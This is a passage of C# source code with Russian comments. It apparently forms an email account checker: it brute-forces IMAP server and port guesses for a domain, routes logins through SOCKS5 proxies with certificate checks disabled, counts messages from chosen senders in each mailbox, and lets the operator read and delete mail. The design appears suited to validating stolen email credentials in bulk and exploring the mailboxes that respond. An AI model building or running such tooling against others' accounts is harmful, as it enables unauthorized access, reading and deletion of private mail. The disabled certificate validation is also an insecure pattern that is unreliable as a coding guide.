            
            { "bk.ru", ("imap.mail.ru", 993, true) },
            { "list.ru", ("imap.mail.ru", 993, true) },
            { "inbox.ru", ("imap.mail.ru", 993, true) },
        };

        public static async Task<List<(string server, int port, bool ssl, string? proxy)>> GetFullServerAttemptsAsync(string domain, string email, string? proxy)
        {
            var attempts = new List<(string, int, bool, string?)>();
            var dict = GetImapDictionary();
            if (dict.ContainsKey(domain))
            {
                var t = dict[domain];
                attempts.Add((t.server, t.port, t.ssl, proxy));
            }
            try
            {
                var cfg = await TryAutoConfigAsync(domain, email, proxy);
                if (cfg != null) attempts.Add((cfg.Value.server, cfg.Value.port, cfg.Value.ssl, proxy));
            }
            catch { }
            foreach (var hostPattern in ImapHosts)
            {
                var host = string.Format(hostPattern, domain);
                foreach (var port in ImapPorts)
                {
                    bool ssl = (port == 993 || port == 995 || port == 1993 || port == 2193 || port == 585 || port == 443);
                    attempts.Add((host, port, ssl, proxy));
                }
            }
            var unique = attempts.GroupBy(a => (a.Item1.ToLowerInvariant(), a.Item2, a.Item3, a.Item4)).Select(g => g.First()).ToList();
            return unique;
        }

        private static async Task<(string server, int port, bool ssl)?> TryAutoConfigAsync(string domain, string email, string proxy)
        {
            var urls = new[]
            {
                $"https://autoconfig.{domain}/mail/config-v1.1.xml?emailaddress={Uri.EscapeDataString(email)}",
                $"https://{domain}/.well-known/autoconfig/mail/config-v1.1.xml?emailaddress={Uri.EscapeDataString(email)}",
                $"http://autoconfig.{domain}/mail/config-v1.1.xml?emailaddress={Uri.EscapeDataString(email)}",
                $"http://{domain}/.well-known/autoconfig/mail/config-v1.1.xml?emailaddress={Uri.EscapeDataString(email)}"
            };
            foreach (var url in urls)
            {
                try
                {
                    using var handler = new System.Net.Http.HttpClientHandler();
                    if (!string.IsNullOrEmpty(proxy))
                    {
                        handler.Proxy = new WebProxy(proxy);
                        handler.UseProxy = true;
                    }
                    using var client = new System.Net.Http.HttpClient(handler) { Timeout = TimeSpan.FromSeconds(6) };
                    var resp = await client.GetAsync(url);
                    if (!resp.IsSuccessStatusCode) continue;
                    var content = await resp.Content.ReadAsStringAsync();
                    if (string.IsNullOrWhiteSpace(content)) continue;
                    var doc = XDocument.Parse(content);
                    var incoming = doc.Descendants("incomingServer").FirstOrDefault(x => string.Equals((string)x.Attribute("type"), "imap", StringComparison.OrdinalIgnoreCase));
                    if (incoming == null) continue;
                    var hostname = incoming.Element("hostname")?.Value?.Trim();
                    var portStr = incoming.Element("port")?.Value?.Trim();
                    var socketType = incoming.Element("socketType")?.Value?.Trim()?.ToLowerInvariant() ?? "ssl";
                    if (string.IsNullOrWhiteSpace(hostname)) continue;
                    int port = 993;
                    if (!int.TryParse(portStr, out port)) port = socketType.Contains("ssl") ? 993 : 143;
                    bool ssl = socketType.Contains("ssl") || socketType.Contains("tls");
                    return (hostname, port, ssl);
                }
                catch { }
            }
            return null;
        }

        public static async Task<(bool Success, string Message, ImapClient? Client, string UsedServer, int UsedPort, bool UsedSsl)> TryConnectAsync(string email, string password, List<(string server, int port, bool ssl, string? proxy)> attempts, TimeSpan connectTimeout, string? proxyStr)
        {
            foreach (var s in attempts)
            {
                ImapClient client = null;
                try
                {
                    client = new ImapClient();
                    client.ServerCertificateValidationCallback = (a, b, c, d) => true;
                   if (!string.IsNullOrEmpty(s.proxy) && s.proxy.StartsWith("socks5://"))
                    {
                        var cleanProxy = s.proxy.Replace("socks5://", "");
                        string proxyHost;
                        int proxyPort;
                        
                        // Обрабатываем формат с аутентификацией: user:pass@host:port
                        if (cleanProxy.Contains('@'))
                        {
                            var atParts = cleanProxy.Split('@');
                            var hostPortPart = atParts[atParts.Length - 1];
                            var hostPortParts = hostPortPart.Split(':');
                            if (hostPortParts.Length >= 2 && int.TryParse(hostPortParts[1], out proxyPort))
                            {
                                proxyHost = hostPortParts[0];
                                var proxy = new MailKit.Net.Proxy.Socks5Client(proxyHost, proxyPort);
                                client.ProxyClient = proxy;
                            }
                        }
                        else
                        {
                            // Обычный формат: host:port
                            var proxyParts = cleanProxy.Split(':');
                            if (proxyParts.Length >= 2 && int.TryParse(proxyParts[1], out proxyPort))
                            {
                                var proxy = new MailKit.Net.Proxy.Socks5Client(proxyParts[0], proxyPort);
                                client.ProxyClient = proxy;
                            }
                        }
                    }
                    var connectTask = client.ConnectAsync(s.server, s.port, s.ssl ? SecureSocketOptions.SslOnConnect : SecureSocketOptions.StartTlsWhenAvailable);
                    var cts = new CancellationTokenSource(connectTimeout);
                    await connectTask.WaitAsync(cts.Token);
                    if (!string.IsNullOrEmpty(password)) await client.AuthenticateAsync(email, password);
                    return (true, "успешно", client, s.server, s.port, s.ssl);
                }
                catch
                {
                    try { client?.Disconnect(true); client?.Dispose(); } catch { }
                }
            }
            return (false, "не удалось подключиться", null, "", 0, true);
        }

        public static async Task<Dictionary<string, int>> ScanFoldersAsync(ImapClient client, List<string> senders)
        {
            var senderCounts = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
            var folders = new List<IMailFolder>();
            try { folders = client.PersonalNamespaces.Select(ns => client.GetFolder(ns)).ToList(); } catch { folders.Add(client.Inbox); }
            foreach (var folder in folders)
            {
                if (folder == null) continue;
                try { if (!folder.IsOpen) await folder.OpenAsync(FolderAccess.ReadOnly); } catch { continue; }
                if (senders.Count == 0)
                {
                    try { var uids = await folder.SearchAsync(SearchQuery.All); if (uids.Count > 0) { senderCounts["ALL"] = uids.Count; } } catch { }
                }
                else
                {
                    foreach (var sender in senders)
                    {
                        try { var uids = await folder.SearchAsync(SearchQuery.FromContains(sender)); if (uids.Count > 0) { if (!senderCounts.ContainsKey(sender)) senderCounts[sender] = 0; senderCounts[sender] += uids.Count; } } catch { }
                    }
                }
                try { await folder.CloseAsync(); } catch { }
            }
            return senderCounts;
        }
    }

    static class MailViewer
    {
        public static async Task ViewMailboxInteractiveAsync(string email, string password, string server, int port, bool ssl, string sendersFile)
        {
            var senders = File.ReadAllLines(sendersFile).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Trim()).ToList();
            using var client = new ImapClient();
            client.ServerCertificateValidationCallback = (s, c, h, e) => true;
            try { await client.ConnectAsync(server, port, ssl); if (!string.IsNullOrEmpty(password)) await client.AuthenticateAsync(email, password); }
            catch { UI.WriteLine("Ошибка подключения к почте", ConsoleColor.Red); return; }
            var folders = new List<IMailFolder>();
            try { folders = client.PersonalNamespaces.Select(ns => client.GetFolder(ns)).ToList(); } catch { folders.Add(client.Inbox); }

            foreach (var folder in folders)
            {
                try { if (!folder.IsOpen) await folder.OpenAsync(FolderAccess.ReadWrite); } catch { continue; }

                SearchQuery query;
                if (senders.Count == 0) query = SearchQuery.All;
                else
                {
                    query = SearchQuery.FromContains(senders[0]);
                    for (int i = 1; i < senders.Count; i++) query = query.Or(SearchQuery.FromContains(senders[i]));
                }

                var uids = await folder.SearchAsync(query);
                if (uids.Count == 0) { UI.WriteLine("Писем не найдено", ConsoleColor.Yellow); continue; }

                var messages = await folder.FetchAsync(uids, MessageSummaryItems.Envelope | MessageSummaryItems.UniqueId | MessageSummaryItems.InternalDate | MessageSummaryItems.BodyStructure);
                var last100 = messages.OrderByDescending(m => m.InternalDate ?? DateTimeOffset.MinValue).Take(100).ToList();
                var senderCounts = last100.GroupBy(m => m.Envelope.From.Mailboxes.FirstOrDefault()?.Address ?? "<unknown>").ToDictionary(g => g.Key, g => g.Count());

                Console.Clear();
                UI.WriteLine($"Почтовый ящик: {email}", ConsoleColor.Green);
                UI.WriteLine($"Всего отправителей: {senderCounts.Count}, всего писем (показано): {last100.Count}", ConsoleColor.DarkGray);

                for (int i = 0; i < last100.Count; i++)
                {
                    var msg = last100[i];
                    string from = msg.Envelope.From.Mailboxes.FirstOrDefault()?.Address ?? "<unknown>";
                    string subj = msg.Envelope.Subject ?? "<без темы>";
                    string date = msg.InternalDate?.ToLocalTime().ToString("yyyy-MM-dd HH:mm") ?? "";
                    UI.WriteLine($"{i + 1}) [{date}] {from} - {subj}", ConsoleColor.DarkGray);
                }

                while (true)
                {
                    UI.WriteLine("\nВведите номер письма для просмотра, D+номер для удаления или Q для выхода:", ConsoleColor.DarkGray);
                    var input = Console.ReadLine()?.Trim();
                    if (string.Equals(input, "q", StringComparison.OrdinalIgnoreCase)) break;
                    if (string.IsNullOrEmpty(input)) continue;

                    if (input.StartsWith("D", StringComparison.OrdinalIgnoreCase))
                    {
                        if (int.TryParse(input.Substring(1), out int delIdx) && delIdx >= 1 && delIdx <= last100.Count)
                        {
                            var delUid = last100[delIdx - 1].UniqueId;
                            try
                            {
                                await folder.AddFlagsAsync(delUid, MessageFlags.Deleted, true);
                                await folder.ExpungeAsync();
                                last100.RemoveAt(delIdx - 1);
                                UI.WriteLine("Письмо удалено", ConsoleColor.Green);
                            }
                            catch
                            {
                                UI.WriteLine("Ошибка удаления письма", ConsoleColor.Red);
                            }
                        }
                        continue;
                    }

                    if (int.TryParse(input, out int idx) && idx >= 1 && idx <= last100.Count)
                    {
                        var fullMsg = await folder.GetMessageAsync(last100[idx - 1].UniqueId);
                        Console.Clear();
                        UI.WriteLine($"От: {fullMsg.From}", ConsoleColor.DarkGray);
                        UI.WriteLine($"Кому: {fullMsg.To}", ConsoleColor.DarkGray);
                        UI.WriteLine($"Тема: {fullMsg.Subject}", ConsoleColor.DarkGray);
                        UI.WriteLine($"Дата: {fullMsg.Date}", ConsoleColor.DarkGray);
                        UI.WriteLine("---- Тело ----", ConsoleColor.DarkGray);
                        string bodyText = GetBodyText(fullMsg);
                        var lines = bodyText?.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries) ?? Array.Empty<string>();
                        foreach (var line in lines) UI.WriteLine(line, ConsoleColor.DarkGray);

                        while (true)
                        {
                            UI.WriteLine("\nD - удалить письмо, B - назад к списку, Q - выйти", ConsoleColor.DarkGray);
                            var cmd = Console.ReadLine()?.Trim();
                            if (string.Equals(cmd, "b", StringComparison.OrdinalIgnoreCase)) break;
                            if (string.Equals(cmd, "q", StringComparison.OrdinalIgnoreCase))
                            {
                                try { await client.DisconnectAsync(true); } catch { }
                                return;
                            }
                            if (string.Equals(cmd, "d", StringComparison.OrdinalIgnoreCase))
                            {
                                try
                                {
                                    await folder.AddFlagsAsync(last100[idx - 1].UniqueId, MessageFlags.Deleted, true);
                                    await folder.ExpungeAsync();
                                    last100.RemoveAt(idx - 1);
                                    UI.WriteLine("Письмо удалено", ConsoleColor.Green);
                                    break;
                                }
                                catch
                                {
                                    UI.WriteLine("Ошибка удаления письма", ConsoleColor.Red);
                                    break;
                                }
                            }
                        }

                        Console.Clear();
                        UI.WriteLine($"Почтовый ящик: {email}", ConsoleColor.Green);
                        UI.WriteLine($"Всего отправителей: {senderCounts.Count}, всего писем (показано): {last100.Count}", ConsoleColor.DarkGray);
                        for (int i = 0; i < last100.Count; i++)
                        {
                            var msg = last100[i];
                            string from = msg.Envelope.From.Mailboxes.FirstOrDefault()?.Address ?? "<unknown>";
                            string subj = msg.Envelope.Subject ?? "<без темы>";
                            string date = msg.InternalDate?.ToLocalTime().ToString("yyyy-MM-dd HH:mm") ?? "";
                            UI.WriteLine($"{i + 1}) [{date}] {from} - {subj}", ConsoleColor.DarkGray);
                        }
                    }
                }

                try { await folder.CloseAsync(); } catch { }
            }

            try { await client.DisconnectAsync(true); } catch { }
        }

        private static string GetBodyText(MimeMessage msg)
        {
            if (msg == null) return "";
            if (msg.TextBody != null) return msg.TextBody;
            if (msg.HtmlBody != null)
            {
                var html = msg.HtmlBody;
                var text = System.Text.RegularExpressions.Regex.Replace(html, "<[^>]+>", " ");
                return System.Net.WebUtility.HtmlDecode(text);
            }
            if (msg.Body == null) return "";
            try
            {
                var part = msg.BodyParts.OfType<TextPart>().FirstOrDefault();
                if (part != null) return part.Text ?? "";
            }
            catch { }
            return "";
        }

    }
}